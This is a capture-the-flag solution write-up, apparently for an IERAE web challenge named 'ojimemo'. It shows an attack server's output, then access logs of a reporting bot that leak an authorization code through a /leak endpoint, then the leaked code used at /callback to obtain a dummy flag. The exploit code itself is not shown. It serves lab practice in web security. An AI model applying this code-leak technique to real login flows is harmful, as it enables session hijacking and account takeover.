# Solution

1. Start server

```bash
$ uv run main.py
login: <Response [200 OK]>
register: <Response [302 Found]>
callback: <Response [302 Found]> <Cookies[<Cookie ojimemo_session=eyJzdWIiOiJlYmUzNjMyMi0wMDY0LTQ4N2QtOTYzNC1iZDg0NmEwYWZkYjkiLCJlbWFpbCI6IjY1MTEzMDg5QHBveW9wb3lvLnBveW9wb3lvIn0%3D.xa5dC8HTYUd%2Bh%2Fv8raNvqitawg88ARed9GAamRksrPw for ojimemo.127-0-0-1.nip.io />]>
change locale: <Response [302 Found]>
callback: <Response [302 Found]> 30abbc22393de40899c141bb8670791b2c6776f9d43406fa504e3739fc02b894
report this URL: http://host.docker.internal:3000/attack
 * Serving Flask app 'main'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:3000
Press CTRL+C to quit
```

2. Report `http://host.docker.internal:3000/attack`

```
127.0.0.1 - - [11/Apr/2025 15:54:32] "GET /attack HTTP/1.1" 200 -
127.0.0.1 - - [11/Apr/2025 15:54:32] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [11/Apr/2025 15:54:32] "GET /leak?/ HTTP/1.1" 200 -
127.0.0.1 - - [11/Apr/2025 15:54:32] "GET /?token= HTTP/1.1" 404 -
127.0.0.1 - - [11/Apr/2025 15:54:33] "GET /leak?/callback HTTP/1.1" 200 -
127.0.0.1 - - [11/Apr/2025 15:54:33] "GET /?token=?code=2760b611134ce5a52aa3d1b7bec76698365864e140e4ce3245843a6fcbb0ac7f HTTP/1.1" 404 -
```

3. Access with leaked code and get flag `IERAE{dummy}`

```bash
http://ojimemo.127-0-0-1.nip.io:36000/callback?code=2760b611134ce5a52aa3d1b7bec76698365864e140e4ce3245843a6fcbb0ac7f
```
